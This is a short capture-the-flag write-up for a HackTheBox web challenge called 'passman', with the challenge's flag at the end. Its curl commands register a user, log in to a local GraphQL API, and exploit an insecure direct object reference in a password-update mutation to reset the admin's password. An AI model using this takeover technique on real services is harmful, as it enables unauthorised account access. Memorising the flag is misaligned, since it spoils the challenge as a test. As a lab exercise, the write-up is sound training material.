# passman

**SOLVED**

> Pandora discovered the presence of a mole within the ministry. 
> To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. 
> Can you hack into the password manager?

`./build-docker.sh`

Dockerfile -> mariadb, node

```sh
# register user
curl 'http://localhost:1337/graphql' \
  -X POST \
  -H 'content-type: application/json' \
  --data '{"query":"mutation{RegisterUser(email:\"test@test.com\",username:\"barrett\",password:\"password\"){message}}"}'

# login as user
curl 'http://localhost:1337/graphql' \
  -X POST \
  -H 'content-type: application/json' \
  --data '{"query":"mutation{LoginUser(username:\"barrett\",password:\"password\"){token message}}"}'
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCJpc19hZG1pbiI6MCwiaWF0IjoxNjc5MjA3MDY5fQ.i7e64OjxzRph5gbPEF5qA2NoN1qqEK5dCGuSXxIOhPQ

curl 'http://localhost:1337/graphql' \
  -X POST \
  -H 'content-type: application/json' \
  -H 'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCJpc19hZG1pbiI6MCwiaWF0IjoxNjc5MjA3MDY5fQ.i7e64OjxzRph5gbPEF5qA2NoN1qqEK5dCGuSXxIOhPQ' \
  --data '{
    "query":"query { getPhraseList { note  } }"
  }'
# {"data":{"getPhraseList":[]}} 

# https://www.apollographql.com/blog/graphql/basics/mutation-vs-query-when-to-use-graphql-mutation/

# change admin password
curl 'http://localhost:1337/graphql' \
  -X POST \
  -H 'content-type: application/json' \
  -H 'Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJhcnJldHQiLCJpc19hZG1pbiI6MCwiaWF0IjoxNjc5MjA3MDY5fQ.i7e64OjxzRph5gbPEF5qA2NoN1qqEK5dCGuSXxIOhPQ' \
  --data '{"query":"mutation($username:String!,$password: String!){UpdatePassword(username:$username,password:$password){message,token}}","variables":{"username":"admin","password":"password"}}'

# signed in as admin and found flag
```

`HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!`
